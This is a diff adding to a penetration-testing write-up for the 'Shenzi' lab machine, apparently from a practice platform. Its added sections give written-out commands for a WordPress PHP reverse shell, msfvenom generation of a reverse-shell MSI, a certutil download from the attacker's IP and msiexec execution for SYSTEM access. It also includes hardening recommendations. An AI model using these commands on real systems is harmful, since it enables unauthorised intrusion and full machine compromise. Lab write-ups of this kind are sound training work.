@@ -6,11 +6,24 @@
 - Date: 04/20/2026
 ## Executive Summary
 
+This machine, Shenzi, was enumerated by `nmap` to have FTP, HTTP, SMB, and MySQL open.
+
+An unauthenticated SMB share was found to have stored passwords.
+
+These passwords were then used to login to WordPress and execute a reverse shell via PHP code that led us to non-SYSTEM access.
+
+We then discovered that the victim had `AlwaysInstallElevated` enabled, which allowed us to execute a malicious `.msi` file as SYSTEM level, gaining a SYSTEM reverse shell and leading to the compromise of the machine.
+
 ### Recommendations
+
+- Disable `AlwaysInstallElevated` in Windows.
+- Require authentication for SMB shares.
+- Turn off services like SMB, MySQL, and FTP if not needed.
 
 ### Resources
 
 - https://medium.com/@ryanchamruiyang/proving-grounds-shenzi-walkthrough-b-70304399b645
+- https://medium.com/@Dpsypher/proving-ground-practice-shenzi-10e684479eb9
 
 ## Recon
 
@@ -36,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.33 seconds
 ```
 
 `nmap` shows we have FTP, HTTP, SMB, and MySQL.
-## Non-root access
+## Non-SYSTEM access
 
 Let's start with SMB enumeration.
 
@@ -113,27 +126,73 @@ We can use this to get a PHP reverse shell.
 - http://shenzi/shenzi/ - wp page
 - http://shenzi/shenzi/wp-admin - wp-admin login
 
+We go to the "Theme Editor" in wp-admin.
 
-## Root access
+http://shenzi/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty
 
-TBD
+We can edit the 404.php page to insert a webshell.
 
-## Proof
+> When attacking Windows machines, I like to use port 135 to avoid egress issues
 
-### Local proof
+https://www.revshells.com/
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat local.txt`
-(IMG_PLACEHOLDER)
+We need to get our attacker ip with `ip a | grep 192`...`192.168.49.59`.
 
-### Root proof
+We need to search for "PHP Ivan Sincek" in revshells.com.
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat proof.txt`
-(IMG_PLACEHOLDER)
+![](Pasted%20image%2020260420135527.png)
+
+http://shenzi/shenzi/potato will work for a 404.
+
+![](Pasted%20image%2020260420135502.png)
+
+We get reverse shell as non-SYSTEM.
+
+## SYSTEM access
+
+Next step from the guide.
+
+> Enumerate registry settings to identify the AlwaysInstallElevated misconfiguration.
+
+```sh
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+#HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+#    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+#     AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+We generate a malicious payload and serve it.
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=80 -f msi -o malicious.msi
+
+python3 -m http.server 80
+```
+
+We download it on the victim.
+
+```sh
+cd C:\Windows\Temp
+certutil -urlcache -f http://192.168.49.59:80/malicious.msi malicious.msi
+```
+
+We kill our python3 process, and start an nc listener.
+
+```sh
+sudo nc -nvlp 80
+```
+
+We execute the payload on the victim.
+
+```sh
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
+
+
+![](Pasted%20image%2020260420143616.png)
+
+We have SYSTEM level access.
